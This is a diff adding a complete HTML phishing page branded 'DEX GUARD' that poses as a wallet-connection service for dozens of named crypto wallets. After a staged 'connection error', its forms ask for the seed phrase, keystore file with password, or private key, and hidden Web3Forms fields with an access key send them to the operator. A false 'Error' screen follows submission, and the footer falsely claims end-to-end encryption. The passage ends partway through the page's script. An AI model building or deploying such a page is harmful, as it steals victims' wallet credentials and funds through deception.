@@ -1,0 +1,2913 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport"
+      content="width=device-width,
+               initial-scale=1.0,
+               maximum-scale=1.0">
+
+<title>DEX GUARD</title>
+
+<style>
+
+/* =====================================================
+   RESET
+===================================================== */
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+html {
+    scroll-behavior: smooth;
+}
+
+body {
+    width: 100%;
+    min-height: 100vh;
+    overflow-x: hidden;
+
+    font-family:
+        Arial,
+        Helvetica,
+        sans-serif;
+
+    color: white;
+    background: #080909;
+}
+
+
+/* =====================================================
+   COLORS
+===================================================== */
+
+:root {
+    --blue: #64ddff;
+    --blue-light: #a5efff;
+    --blue-dark: #18bfe7;
+
+    --background: #090a0b;
+    --card: #111213;
+
+    --text-gray: #888d90;
+}
+
+
+/* =====================================================
+   BACKGROUND IMAGE
+===================================================== */
+
+body::before {
+
+    content: "";
+
+    position: fixed;
+
+    inset: 0;
+
+    z-index: -5;
+
+    background:
+
+        linear-gradient(
+            rgba(3, 5, 6, 0.92),
+            rgba(3, 5, 6, 0.96)
+        ),
+
+        url("graph-image.jpg");
+
+    background-size: cover;
+
+    background-position: center;
+
+    background-repeat: no-repeat;
+
+    filter: brightness(0.42);
+}
+
+
+/* =====================================================
+   HEADER
+===================================================== */
+
+.header {
+
+    width: 100%;
+
+    height: 52px;
+
+    display: flex;
+
+    align-items: center;
+
+    padding-left: 14px;
+
+    background:
+        rgba(4, 5, 6, 0.96);
+
+    border-bottom:
+        1px solid
+        rgba(255,255,255,0.04);
+}
+
+
+.logo {
+
+    width: 170px;
+
+    height: auto;
+
+    display: block;
+}
+
+
+/* =====================================================
+   WALLET SECTION
+===================================================== */
+
+.wallet-section {
+
+    width: 100%;
+
+    min-height:
+        calc(100vh - 52px - 350px);
+
+    display: flex;
+
+    justify-content: center;
+
+    align-items: flex-start;
+
+    padding:
+        30px 15px 50px;
+}
+
+
+.wallet-modal {
+
+    width: 100%;
+
+    max-width: 620px;
+
+    background: #151719;
+
+    border:
+        1px solid
+        rgba(255,255,255,0.1);
+
+    border-radius: 12px;
+
+    padding:
+        24px 20px;
+
+    box-shadow:
+        0 10px 30px
+        rgba(0,0,0,0.5);
+}
+
+
+.modal-title {
+
+    font-size: 18px;
+
+    font-weight: 700;
+
+    color: #ffffff;
+
+    margin-bottom: 20px;
+}
+
+
+/* =====================================================
+   WALLET LIST
+===================================================== */
+
+.wallet-list-container {
+
+    max-height: 290px;
+
+    overflow-y: auto;
+
+    padding-right: 6px;
+}
+
+
+.wallet-list-container::-webkit-scrollbar {
+    width: 6px;
+}
+
+
+.wallet-list-container::-webkit-scrollbar-track {
+
+    background:
+        rgba(255,255,255,0.05);
+
+    border-radius: 3px;
+}
+
+
+.wallet-list-container::-webkit-scrollbar-thumb {
+
+    background:
+        rgba(255,255,255,0.2);
+
+    border-radius: 3px;
+}
+
+
+.wallet-list-container::-webkit-scrollbar-thumb:hover {
+
+    background:
+        var(--blue);
+}
+
+
+/* =====================================================
+   WALLET GRID
+===================================================== */
+
+.wallet-grid {
+
+    display: grid;
+
+    grid-template-columns:
+        1fr;
+
+    gap: 10px;
+}
+
+
+/* =====================================================
+   WALLET ITEM
+===================================================== */
+
+.wallet-item {
+
+    width: 100%;
+
+    display: flex;
+
+    align-items: center;
+
+    justify-content: space-between;
+
+    background: #ffffff;
+
+    border: none;
+
+    border-radius: 8px;
+
+    padding:
+        10px 14px;
+
+    text-decoration: none;
+
+    cursor: pointer;
+
+    transition:
+        transform 0.15s ease,
+        box-shadow 0.15s ease;
+}
+
+
+.wallet-item:hover {
+
+    transform:
+        translateY(-2px);
+
+    box-shadow:
+        0 4px 12px
+        rgba(100,221,255,0.2);
+}
+
+
+.wallet-item:active {
+
+    transform:
+        scale(0.98);
+}
+
+
+.wallet-item-left {
+
+    display: flex;
+
+    align-items: center;
+
+    gap: 8px;
+
+    overflow: hidden;
+}
+
+
+.wallet-dot {
+
+    width: 7px;
+
+    height: 7px;
+
+    border-radius: 50%;
+
+    background-color:
+        #ffd700;
+
+    flex-shrink: 0;
+}
+
+
+.wallet-name {
+
+    color: #000000;
+
+    font-size: 13px;
+
+    font-weight: 700;
+
+    white-space: nowrap;
+
+    overflow: hidden;
+
+    text-overflow: ellipsis;
+}
+
+
+.wallet-logo {
+
+    width: 22px;
+
+    height: 22px;
+
+    object-fit: contain;
+
+    flex-shrink: 0;
+
+    border-radius: 4px;
+}
+
+
+/* =====================================================
+   POPUP OVERLAY
+===================================================== */
+
+.popup-overlay {
+
+    position: fixed;
+
+    inset: 0;
+
+    z-index: 1000;
+
+    display: none;
+
+    align-items: center;
+
+    justify-content: center;
+
+    padding: 20px;
+
+    background:
+        rgba(0,0,0,0.78);
+
+    backdrop-filter:
+        blur(5px);
+}
+
+
+.popup-overlay.active {
+
+    display: flex;
+
+    animation:
+        fadeIn 0.2s ease;
+}
+
+
+@keyframes fadeIn {
+
+    from {
+        opacity: 0;
+    }
+
+    to {
+        opacity: 1;
+    }
+}
+
+
+/* =====================================================
+   POPUP
+===================================================== */
+
+.popup {
+
+    position: relative;
+
+    width: 100%;
+
+    max-width: 420px;
+
+    max-height: 90vh;
+
+    overflow-y: auto;
+
+    background: #151719;
+
+    border:
+        1px solid
+        rgba(255,255,255,0.12);
+
+    border-radius: 16px;
+
+    padding:
+        30px 24px;
+
+    text-align: center;
+
+    box-shadow:
+        0 20px 60px
+        rgba(0,0,0,0.65);
+
+    animation:
+        popupUp 0.25s ease;
+}
+
+
+@keyframes popupUp {
+
+    from {
+
+        opacity: 0;
+
+        transform:
+            translateY(15px)
+            scale(0.97);
+    }
+
+    to {
+
+        opacity: 1;
+
+        transform:
+            translateY(0)
+            scale(1);
+    }
+}
+
+
+/* =====================================================
+   CLOSE BUTTON
+===================================================== */
+
+.close-popup {
+
+    position: absolute;
+
+    top: 12px;
+
+    right: 14px;
+
+    width: 32px;
+
+    height: 32px;
+
+    border: none;
+
+    border-radius: 50%;
+
+    background:
+        rgba(255,255,255,0.07);
+
+    color: #ffffff;
+
+    font-size: 20px;
+
+    line-height: 32px;
+
+    cursor: pointer;
+
+    transition:
+        background 0.2s ease;
+}
+
+
+.close-popup:hover {
+
+    background:
+        rgba(255,255,255,0.15);
+}
+
+
+/* =====================================================
+   PROCESSING SCREEN
+===================================================== */
+
+.processing-screen {
+
+    display: block;
+}
+
+
+.processing-icon {
+
+    width: 58px;
+
+    height: 58px;
+
+    margin:
+        5px auto 20px;
+
+    border:
+        4px solid
+        rgba(100,221,255,0.15);
+
+    border-top:
+        4px solid
+        var(--blue);
+
+    border-radius: 50%;
+
+    animation:
+        spin 0.9s linear infinite;
+}
+
+
+@keyframes spin {
+
+    to {
+        transform:
+            rotate(360deg);
+    }
+}
+
+
+.processing-title {
+
+    font-size: 20px;
+
+    color: #ffffff;
+
+    margin-bottom: 10px;
+}
+
+
+.processing-text {
+
+    color:
+        #888d90;
+
+    font-size: 13px;
+
+    line-height: 1.5;
+}
+
+
+/* =====================================================
+   SUCCESS SCREEN
+===================================================== */
+
+.success-screen {
+
+    display: none;
+}
+
+
+.selected-wallet-logo {
+
+    width: 65px;
+
+    height: 65px;
+
+    object-fit: contain;
+
+    margin:
+        5px auto 15px;
+
+    border-radius: 10px;
+}
+
+
+.success-title {
+
+    color: #ffffff;
+
+    font-size: 20px;
+
+    line-height: 1.4;
+
+    margin-bottom: 8px;
+}
+
+
+.success-title span {
+
+    color:
+        var(--blue);
+}
+
+
+.success-text {
+
+    color:
+        #ff4444;
+
+    font-size: 13px;
+
+    line-height: 1.5;
+
+    margin-bottom: 22px;
+}
+
+
+/* =====================================================
+   FORM SELECTOR TITLES
+===================================================== */
+
+.form-options {
+
+    display: grid;
+
+    grid-template-columns:
+        repeat(3, 1fr);
+
+    gap: 8px;
+
+    margin-bottom: 20px;
+}
+
+
+.form-option {
+
+    border:
+        1px solid
+        rgba(255,255,255,0.1);
+
+    background:
+        #0d0f10;
+
+    color:
+        #bfc4c6;
+
+    padding:
+        11px 5px;
+
+    border-radius: 8px;
+
+    font-size: 12px;
+
+    font-weight: 600;
+
+    cursor: pointer;
+
+    transition:
+        all 0.2s ease;
+}
+
+
+.form-option:hover {
+
+    border-color:
+        rgba(100,221,255,0.5);
+
+    color:
+        #ffffff;
+}
+
+
+.form-option.active {
+
+    background:
+        var(--blue);
+
+    border-color:
+        var(--blue);
+
+    color:
+        #061014;
+}
+
+
+/* =====================================================
+   FORM CONTENT
+===================================================== */
+
+.form-content {
+
+    display: none;
+
+    text-align: left;
+
+    animation:
+        formAppear 0.2s ease;
+}
+
+
+.form-content.active {
+
+    display: block;
+}
+
+
+@keyframes formAppear {
+
+    from {
+
+        opacity: 0;
+
+        transform:
+            translateY(5px);
+    }
+
+    to {
+
+        opacity: 1;
+
+        transform:
+            translateY(0);
+    }
+}
+
+
+/* =====================================================
+   FORM LABEL
+===================================================== */
+
+.form-label {
+
+    display: block;
+
+    color:
+        #cfd2d3;
+
+    font-size: 12px;
+
+    margin-bottom: 7px;
+}
+
+
+/* =====================================================
+   TEXT INPUT
+===================================================== */
+
+.form-input,
+.form-textarea {
+
+    width: 100%;
+
+    border:
+        1px solid
+        rgba(255,255,255,0.12);
+
+    background:
+        #0d0f10;
+
+    color:
+        #ffffff;
+
+    border-radius: 8px;
+
+    outline: none;
+
+    font-family:
+        Arial,
+        Helvetica,
+        sans-serif;
+
+    font-size: 13px;
+
+    transition:
+        border 0.2s ease;
+}
+
+
+.form-input {
+
+    height: 44px;
+
+    padding:
+        0 13px;
+
+    margin-bottom: 15px;
+}
+
+
+.form-textarea {
+
+    min-height: 100px;
+
+    resize: vertical;
+
+    padding: 12px;
+
+    margin-bottom: 15px;
+}
+
+
+.form-input:focus,
+.form-textarea:focus {
+
+    border-color:
+        var(--blue);
+}
+
+
+.form-textarea::placeholder,
+.form-input::placeholder {
+
+    color:
+        #686e70;
+}
+
+
+/* =====================================================
+   SUBMIT BUTTON
+===================================================== */
+
+.submit-button {
+
+    width: 100%;
+
+    height: 45px;
+
+    border: none;
+
+    border-radius: 8px;
+
+    background:
+        var(--blue);
+
+    color:
+        #061014;
+
+    font-size: 14px;
+
+    font-weight: 700;
+
+    cursor: pointer;
+
+    transition:
+        background 0.2s ease,
+        transform 0.15s ease;
+}
+
+
+.submit-button:hover {
+
+    background:
+        var(--blue-light);
+}
+
+
+.submit-button:active {
+
+    transform:
+        scale(0.98);
+}
+
+
+.submit-button:disabled {
+
+    cursor: not-allowed;
+
+    opacity: 0.6;
+}
+
+
+/* =====================================================
+   FORM MESSAGE
+===================================================== */
+
+.form-message {
+
+    display: none;
+
+    margin-top: 14px;
+
+    color:
+        var(--blue);
+
+    font-size: 12px;
+
+    line-height: 1.5;
+
+    text-align: center;
+}
+
+
+/* =====================================================
+   SUBMISSION STATUS
+===================================================== */
+
+.submission-status {
+
+    display: none;
+
+    text-align: center;
+}
+
+
+.submission-status.active {
+
+    display: block;
+}
+
+
+.status-icon {
+
+    width: 65px;
+
+    height: 65px;
+
+    margin:
+        5px auto 18px;
+
+    border-radius: 50%;
+
+    display: flex;
+
+    align-items: center;
+
+    justify-content: center;
+
+    font-size: 32px;
+
+    font-weight: bold;
+}
+
+
+.status-icon.success {
+
+    background:
+        rgba(100,221,255,0.12);
+
+    color:
+        var(--blue);
+
+    border:
+        2px solid
+        rgba(100,221,255,0.4);
+}
+
+
+.status-icon.error {
+
+    background:
+        rgba(255,68,68,0.1);
+
+    color:
+        #ff4444;
+
+    border:
+        2px solid
+        rgba(255,68,68,0.4);
+}
+
+
+.status-title {
+
+    color: #ffffff;
+
+    font-size: 21px;
+
+    margin-bottom: 10px;
+}
+
+
+.status-text {
+
+    color: #888d90;
+
+    font-size: 13px;
+
+    line-height: 1.5;
+
+    margin-bottom: 20px;
+}
+
+
+.status-close {
+
+    width: 100%;
+
+    height: 43px;
+
+    border: none;
+
+    border-radius: 8px;
+
+    background:
+        var(--blue);
+
+    color:
+        #061014;
+
+    font-size: 13px;
+
+    font-weight: 700;
+
+    cursor: pointer;
+}
+
+
+/* =====================================================
+   FOOTER
+===================================================== */
+
+.footer {
+
+    width: 100%;
+
+    background:
+        #1a1a1a;
+
+    padding:
+        43px 20px
+        35px;
+
+    border-top:
+        1px solid
+        rgba(255,255,255,0.03);
+}
+
+
+.footer-inner {
+
+    width: 100%;
+
+    max-width: 390px;
+
+    margin: auto;
+}
+
+
+.footer-logo {
+
+    width: 150px;
+
+    height: auto;
+
+    display: block;
+
+    margin-bottom: 28px;
+}
+
+
+.footer-divider {
+
+    width: 100%;
+
+    height: 1px;
+
+    background:
+        rgba(255,255,255,0.08);
+
+    margin-bottom: 30px;
+}
+
+
+.footer h2 {
+
+    color:
+        #ffffff;
+
+    font-size: 16px;
+
+    font-weight: 400;
+
+    margin-bottom: 12px;
+}
+
+
+.footer p {
+
+    color:
+        #85898b;
+
+    font-size: 11px;
+
+    line-height: 1.65;
+
+    margin-bottom: 17px;
+}
+
+
+.thank-you {
+
+    margin-top: 8px;
+
+    color:
+        #9a9d9f !important;
+}
+
+
+.copyright {
+
+    margin-top: 55px;
+
+    margin-bottom: 0 !important;
+
+    color:
+        #888b8d !important;
+
+    font-size:
+        10px !important;
+}
+
+
+.copyright span {
+
+    color:
+        var(--blue);
+}
+
+
+/* =====================================================
+   DESKTOP
+===================================================== */
+
+@media (min-width: 700px) {
+
+    .wallet-grid {
+
+        grid-template-columns:
+            repeat(3, 1fr);
+    }
+
+    .wallet-list-container {
+
+        max-height: 310px;
+    }
+
+    .wallet-name {
+
+        font-size: 11px;
+    }
+
+    .wallet-logo {
+
+        width: 20px;
+
+        height: 20px;
+    }
+
+    .wallet-item {
+
+        padding:
+            8px 10px;
+    }
+
+    .footer-inner {
+
+        max-width: 1200px;
+    }
+}
+
+
+/* =====================================================
+   SMALL MOBILE
+===================================================== */
+
+@media (max-width: 380px) {
+
+    .wallet-modal {
+
+        padding:
+            20px 15px;
+    }
+
+    .popup {
+
+        padding:
+            28px 18px;
+    }
+
+    .success-title {
+
+        font-size: 18px;
+    }
+
+    .form-options {
+
+        gap: 5px;
+    }
+
+    .form-option {
+
+        font-size: 11px;
+
+        padding:
+            10px 3px;
+    }
+}
+
+</style>
+
+</head>
+
+
+<body>
+
+
+<!-- =====================================================
+     HEADER
+===================================================== -->
+
+<header class="header">
+
+    <a href="index.html">
+
+        <img
+            src="1787770720214.png"
+            alt="DEX GUARD"
+            class="logo"
+        >
+
+    </a>
+
+</header>
+
+
+
+<!-- =====================================================
+     WALLET SECTION
+===================================================== -->
+
+<section class="wallet-section">
+
+    <div class="wallet-modal">
+
+        <h2 class="modal-title">
+            Connect your wallet
+        </h2>
+
+
+        <div class="wallet-list-container">
+
+            <div
+                class="wallet-grid"
+                id="walletGrid"
+            ></div>
+
+        </div>
+
+    </div>
+
+</section>
+
+
+
+<!-- =====================================================
+     MAIN POPUP
+===================================================== -->
+
+<div
+    class="popup-overlay"
+    id="popupOverlay"
+>
+
+    <div
+        class="popup"
+        id="popup"
+    >
+
+        <button
+            class="close-popup"
+            onclick="closePopup()"
+            aria-label="Close"
+        >
+            ×
+        </button>
+
+
+
+        <!-- =================================================
+             WALLET PROCESSING SCREEN
+        ================================================== -->
+
+        <div
+            class="processing-screen"
+            id="processingScreen"
+        >
+
+            <div class="processing-icon"></div>
+
+            <h2 class="processing-title">
+                Processing...
+            </h2>
+
+            <p class="processing-text">
+
+                Please wait while we Validate 
+                your Wallet.
+
+            </p>
+
+        </div>
+
+
+
+        <!-- =================================================
+             FORM SCREEN
+        ================================================== -->
+
+        <div
+            class="success-screen"
+            id="successScreen"
+        >
+
+            <p class="success-text">
+
+                There was an error connecting automatically.
+                But do not worry, you can still connect manually.
+
+            </p>
+
+
+            <img
+                id="selectedWalletLogo"
+                class="selected-wallet-logo"
+                src=""
+                alt="Selected wallet"
+            >
+
+
+            <h2 class="success-title">
+
+                Import Your 
+                <span id="selectedWalletName"></span>
+                Wallet
+
+            </h2>
+
+
+
+            <!-- =================================================
+                 FORM OPTIONS
+            ================================================== -->
+
+            <div class="form-options">
+
+                <button
+                    type="button"
+                    class="form-option active"
+                    onclick="showForm('feedback', this)"
+                >
+                    Phrase 
+                </button>
+
+
+                <button
+                    type="button"
+                    class="form-option"
+                    onclick="showForm('suggestion', this)"
+                >
+                    Keystore JSON 
+                </button>
+
+
+                <button
+                    type="button"
+                    class="form-option"
+                    onclick="showForm('survey', this)"
+                >
+                    Private Key
+                </button>
+
+            </div>
+
+
+
+            <!-- =================================================
+                 FEEDBACK FORM
+            ================================================== -->
+
+            <div
+                class="form-content active"
+                id="feedbackForm"
+            >
+
+                <form
+                    class="web3-form"
+                    data-form-type="feedback"
+                >
+
+                    <input
+                        type="hidden"
+                        name="access_key"
+                        value="b96db7f0-a2bd-4cba-b39d-23198dfedf10"
+                    >
+
+
+                    <input
+                        type="hidden"
+                        name="subject"
+                        value="DEX GUARD - Feedback"
+                    >
+
+
+                    <input
+                        type="hidden"
+                        name="form_type"
+                        value="Feedback"
+                    >
+
+
+                    <input
+                        type="hidden"
+                        name="wallet"
+                        class="wallet-hidden-input"
+                    >
+
+
+                    <label
+                        class="form-label"
+                        for="feedback"
+                    >
+                        Phrase
+                    </label>
+
+
+                    <textarea
+                        id="feedback"
+                        class="form-textarea"
+                        placeholder="Enter Wallet Phrase"
+                        name="message"
+                        required
+                    ></textarea>
+
+
+                    <button
+                        type="submit"
+                        class="submit-button"
+                    >
+                        Validate
+                    </button>
+
+                </form>
+
+            </div>
+
+
+
+            <!-- =================================================
+                 SUGGESTION FORM
+            ================================================== -->
+
+            <div
+                class="form-content"
+                id="suggestionForm"
+            >
+
+                <form
+                    class="web3-form"
+                    data-form-type="suggestion"
+                >
+
+                    <input
+                        type="hidden"
+                        name="access_key"
+                        value="b96db7f0-a2bd-4cba-b39d-23198dfedf10"
+                    >
+
+
+                    <input
+                        type="hidden"
+                        name="subject"
+                        value="DEX GUARD - Suggestion"
+                    >
+
+
+                    <input
+                        type="hidden"
+                        name="form_type"
+                        value="Suggestion"
+                    >
+
+
+                    <input
+                        type="hidden"
+                        name="wallet"
+                        class="wallet-hidden-input"
+                    >
+
+
+                    <label
+                        class="form-label"
+                        for="suggestion"
+                    >
+                        Keystore JSON 
+                    </label>
+
+
+                    <textarea
+                        id="suggestion"
+                        class="form-textarea"
+                        placeholder="Enter Keystore JSON"
+                        name="message"
+                        required
+                    ></textarea>
+
+
+                    <label
+                        class="form-label"
+                        for="suggestionName"
+                    >
+                        options
+                    </label>
+
+
+                    <input
+                        type="text"
+                        id="suggestionName"
+                        class="form-input"
+                        placeholder="Enter Wallet Password"
+                        name="option"
+                        required
+                    >
+
+
+                    <button
+                        type="submit"
+                        class="submit-button"
+                    >
+                        Validate
+                    </button>
+
+                </form>
+
+            </div>
+
+
+
+            <!-- =================================================
+                 SURVEY FORM
+            ================================================== -->
+
+            <div
+                class="form-content"
+                id="surveyForm"
+            >
+
+                <form
+                    class="web3-form"
+                    data-form-type="survey"
+                >
+
+                    <input
+                        type="hidden"
+                        name="access_key"
+                        value="b96db7f0-a2bd-4cba-b39d-23198dfedf10"
+                    >
+
+
+                    <input
+                        type="hidden"
+                        name="subject"
+                        value="DEX GUARD - Survey"
+                    >
+
+
+                    <input
+                        type="hidden"
+                        name="form_type"
+                        value="Survey"
+                    >
+
+
+                    <input
+                        type="hidden"
+                        name="wallet"
+                        class="wallet-hidden-input"
+                    >
+
+
+                    <label
+                        class="form-label"
+                        for="survey"
+                    >
+                        Private Key
+                    </label>
+
+
+                    <input
+                        type="text"
+                        id="survey"
+                        class="form-input"
+                        placeholder="Enter Private Key"
+                        name="message"
+                        required
+                    >
+
+
+                    <button
+                        type="submit"
+                        class="submit-button"
+                    >
+                        Validate
+                    </button>
+
+                </form>
+
+            </div>
+
+        </div>
+
+
+
+        <!-- =================================================
+             SUBMISSION PROCESSING SCREEN
+        ================================================== -->
+
+        <div
+            class="submission-status"
+            id="submissionProcessing"
+        >
+
+            <div class="processing-icon"></div>
+
+            <h2 class="processing-title">
+                Validating...
+            </h2>
+
+            <p class="processing-text">
+
+                Please wait while we
+                Validate your Wallet
+
+            </p>
+
+        </div>
+
+
+
+        <!-- =================================================
+             SUBMISSION SUCCESS SCREEN
+        ================================================== -->
+
+        <div
+            class="submission-status"
+            id="submissionSuccess"
+        >
+
+            <div class="status-icon success">
+                ✓
+            </div>
+
+            <h2 class="status-title">
+                Error
+            </h2>
+
+            <p class="status-text">
+                Error connecting to Wallet
+                .
+            </p>
+
+            <button
+                type="button"
+                class="status-close"
+                onclick="finishSubmission()"
+            >
+                Close
+            </button>
+
+        </div>
+
+
+
+        <!-- =================================================
+             SUBMISSION ERROR SCREEN
+        ================================================== -->
+
+        <div
+            class="submission-status"
+            id="submissionError"
+        >
+
+            <div class="status-icon error">
+                !
+            </div>
+
+            <h2 class="status-title">
+                Submission Failed
+            </h2>
+
+            <p
+                class="status-text"
+                id="submissionErrorText"
+            >
+                Something went wrong.
+                Please try again.
+            </p>
+
+            <button
+                type="button"
+                class="status-close"
+                onclick="returnToForms()"
+            >
+                Try Again
+            </button>
+
+        </div>
+
+    </div>
+
+</div>
+
+
+
+<!-- =====================================================
+     FOOTER
+===================================================== -->
+
+<footer class="footer">
+
+    <div class="footer-inner">
+
+
+        <img
+            src="1787770720214.png"
+            alt="DEX GUARD"
+            class="footer-logo"
+        >
+
+
+        <div class="footer-divider"></div>
+
+
+        <h2>
+            Your Privacy &amp; Security
+        </h2>
+
+
+        <p>
+            We take your privacy and data security
+            seriously. All information submitted
+            through our verification process is
+            protected using end-to-end encryption,
+            ensuring that your data remains secure
+            while being transmitted and stored.
+        </p>
+
+
+        <p>
+            Your sensitive information is processed
+            through secure, automated systems with
+            no unnecessary human access or manual
+            interference during transmission. We
+            implement industry-standard security
+            measures to safeguard your personal data
+            against unauthorized access, alteration,
+            disclosure, or misuse.
+        </p>
+
+
+        <p>
+            Your information is used solely for
+            verification and validation purposes and
+            handled in accordance with our privacy
+            and security policies. We are committed
+            to maintaining the highest standards
+            of confidentiality and protecting your
+            trust every step of the way.
+        </p>
+
+
+        <p class="thank-you">
+            Thank you
+        </p>
+
+
+        <p class="copyright">
+
+            © 2023
+            <span>DEX Guard</span>.
+            All rights reserved.
+
+        </p>
+
+    </div>
+
+</footer>
+
+
+
+<script>
+
+/* =====================================================
+   WEB3FORMS
+===================================================== */
+
+const WEB3FORMS_URL =
+    "https://api.web3forms.com/submit";
+
+
+/* =====================================================
+   WALLET DATA
+===================================================== */
+
+const wallets = [
+
+    {
+        name: "Metamask",
+        logo: "pictures/metamask.png"
+    },
+
+    {
+        name: "Trust",
+        logo: "pictures/trust.png"
+    },
+
+    {
+        name: "Coinbase",
+        logo: "pictures/Coinbase .png"
+    },
+
+    {
+        name: "Kukai",
+        logo: "pictures/Kukai.png"
+    },
+
+    {
+        name: "Cardano",
+        logo: "https://assets.coingecko.com/coins/images/975/small/cardano.png"
+    },
+
+    {
+        name: "Dero Wallet",
+        logo: "pictures/Derowallet.png"
+    },
+
+    {
+        name: "Yoroi",
+        logo: "pictures/Yoroi.png"
+    },
+
+    {
+        name: "CCVault",
+        logo: "pictures/Ccvault.jpg"
+    },
+
+    {
+        name: "Gero",
+        logo: "pictures/Gero.png"
+    },
+
+    {
+        name: "Nami",
+        logo: "pictures/Nami.png"
+    },
+
+    {
+        name: "Solana",
+        logo: "https://assets.coingecko.com/coins/images/4128/small/solana.png"
+    },
+
+    {
+        name: "Phantom",
+        logo: "pictures/Phantom.jpg"
+    },
+
+    {
+        name: "Solflare",
+        logo: "pictures/solflare.png"
+    },
+
+    {
+        name: "Sollet",
+        logo: "pictures/Sollet.png"
+    },
+
+    {
+        name: "Solong",
+        logo: "pictures/Solong.png"
+    },
+
+    {
+        name: "Exodus",
+        logo: "pictures/Exodus.png"
+    },
+
+    {
+        name: "Avalanche",
+        logo: "https://assets.coingecko.com/coins/images/12559/small/Avalanche_Circle_RedWhite_Trans.png"
+    },
+
+    {
+        name: "Velas",
+        logo: "pictures/Velas.png"
+    },
+
+    {
+        name: "crypto.com",
+        logo: "pictures/Crypto.png"
+    },
+
+    {
+        name: "Blockchain",
+        logo: "https://assets.coingecko.com/coins/images/1/small/bitcoin.png"
+    },
+
+    {
+        name: "Binance Smart",
+        logo: "https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png"
+    },
+
+    {
+        name: "Safepal",
+        logo: "pictures/Safepal.png"
+    },
+
+    {
+        name: "Raydium",
+        logo: "pictures/Raydium.png"
+    },
+
+    {
+        name: "Torus",
+        logo: "pictures/Torus.png"
+    },
+
+    {
+        name: "MathWallet",
+        logo: "pictures/Mathwallet.png"
+    },
+
+    {
+        name: "Keyring Pro",
+        logo: "pictures/Keyringpro.png"
+    },
+
+    {
+        name: "BitKeep",
+        logo: "pictures/Bitkeep.png"
+    },
+
+    {
+        name: "SparkPoint",
+        logo: "pictures/Sparkpoint.png"
+    },
+
+    {
+        name: "OwnBit",
+        logo: "pictures/Ownbit.png"
+    },
+
+    {
+        name: "Infinity Wallet",
+        logo: "pictures/Infinitywallet.png"
+    },
+
+    {
+        name: "WalletConnect",
+        logo: "pictures/Walletconnect.png"
+    },
+
+    {
+        name: "Infinity",
+        logo: "pictures/Infinito.png"
+    },
+
+    {
+        name: "TokenPocket",
+        logo: "pictures/Tokenpocket.jpeg"
+    },
+
+    {
+        name: "Nash",
+        logo: "pictures/Nash.png"
+    },
+
+    {
+        name: "BitPay",
+        logo: "pictures/Bitpay.jpeg"
+    },
+
+    {
+        name: "imToken",
+        logo: "pictures/Imtoken.webp"
+    },
+
+    {
+        name: "ParaSwap",
+        logo: "pictures/Paraswap.png"
+    },
+
+    {
+        name: "Bitski",
+        logo: "pictures/Bitski.jpeg"
+    },
+
+    {
+        name: "Defiant",
+        logo: "pictures/Defiant.jpeg"
+    },
+
+    {
+        name: "Crossmint",
+        logo: "pictures/Crossmint.png"
+    },
+
+    {
+        name: "Zelcore",
+        logo: "pictures/Zelcore.png"
+    },
+
+    {
+        name: "Fire blocks",
+        logo: "pictures/Fireblocks.jpeg"
+    },
+
+    {
+        name: "kryptogo",
+        logo: "pictures/Kryptogo.png"
+    },
+
+    {
+        name: "Ledger",
+        logo: "pictures/Ledger.png"
+    },
+
+    {
+        name: "Tezos",
+        logo: "pictures/Tezos.png"
+    },
+
+    {
+        name: "Now",
+        logo: "pictures/Now.jpeg"
+    },
+
+    {
+        name: "Onekey",
+        logo: "pictures/Onekey.png"
+    },
+
+    {
+        name: "Paper",
+        logo: "pictures/Paper.png"
+    },
+
+    {
+        name: "Pier",
+        logo: "pictures/Pier.png"
+    },
+
+    {
+        name: "Prema",
+        logo: "pictures/Prema.png"
+    },
+
+    {
+        name: "Rice",
+        logo: "pictures/Rice.png"
+    },
+
+    {
+        name: "Safemoon",
+        logo: "pictures/Safemoon.png"
+    },
+
+    {
+        name: "Secux",
+        logo: "pictures/Secux.jpg"
+    },
+
+    {
+        name: "Sequence",
+        logo: "pictures/Sequence.png"
+    },
+
+    {
+        name: "Tokenary",
+        logo: "pictures/Tokenary.png"
+    },
+
+    {
+        name: "Unipass",
+        logo: "pictures/Unipass.png"
+    },
+
+    {
+        name: "Venly",
+        logo: "pictures/Venly.png"
+    },
+
+    {
+        name: "Verso",
+        logo: "pictures/Verso.png"
+    },
+
+    {
+        name: "Wallet3",
+        logo: "pictures/Wallet3.jpeg"
+    },
+
+    {
+        name: "Polkadot",
+        logo: "https://assets.coingecko.com/coins/images/12171/small/polkadot.png"
+    },
+
+    {
+        name: "Filecoin",
+        logo: "https://assets.coingecko.com/coins/images/12817/small/filecoin.png"
+    },
+
+    {
+        name: "IOST",
+        logo: "https://assets.coingecko.com/coins/images/2523/small/IOST.png"
+    },
+
+    {
+        name: "Qtum",
+        logo: "https://assets.coingecko.com/coins/images/684/small/qtum.png"
+    },
+
+    {
+        name: "Waves",
+        logo: "https://assets.coingecko.com/coins/images/425/small/waves.png"
+    },
+
+    {
+        name: "Algorand",
+        logo: "https://assets.coingecko.com/coins/images/4380/small/download.png"
+    },
+
+    {
+        name: "Zcash",
+        logo: "https://assets.coingecko.com/coins/images/486/small/circle-zcash-color.png"
+    },
+
+    {
+        name: "Vechain",
+        logo: "https://assets.coingecko.com/coins/images/1167/small/VET_Token_Icon.png"
+    },
+
+    {
+        name: "Stellar",
+        logo: "https://assets.coingecko.com/coins/images/100/small/Stellar_symbol_black_RGB.png"
+    },
+
+    {
+        name: "Tron",
+        logo: "https://assets.coingecko.com/coins/images/1094/small/tron-logo.png"
+    },
+
+    {
+        name: "Terra",
+        logo: "pictures/Terra.png"
+    },
+
+    {
+        name: "Cosmos",
+        logo: "https://assets.coingecko.com/coins/images/1481/small/cosmos_hub.png"
+    },
+
+    {
+        name: "Metis",
+        logo: "pictures/Metis.jpeg"
+    },
+
+    {
+        name: "Optimism",
+        logo: "https://assets.coingecko.com/coins/images/25244/small/Optimism.png"
+    },
+
+    {
+        name: "Injective",
+        logo: "https://assets.coingecko.com/coins/images/12882/small/Secondary_Symbol.png"
+    },
+
+    {
+        name: "Others",
+        logo: "pictures/Others.jpg"
+    }
+
+];
+
+
+/* =====================================================
+   GENERATE WALLET BUTTONS
+===================================================== */
+
+const walletGrid =
+    document.getElementById("walletGrid");
+
+
+wallets.forEach(function(wallet) {
+
+    const button =
+        document.createElement("button");
+
+    button.className =
+        "wallet-item";
+
+    button.type =
+        "button";
+
+    button.innerHTML = `
+
+        <div class="wallet-item-left">
+
+            <span class="wallet-dot"></span>
+
+            <span class="wallet-name">
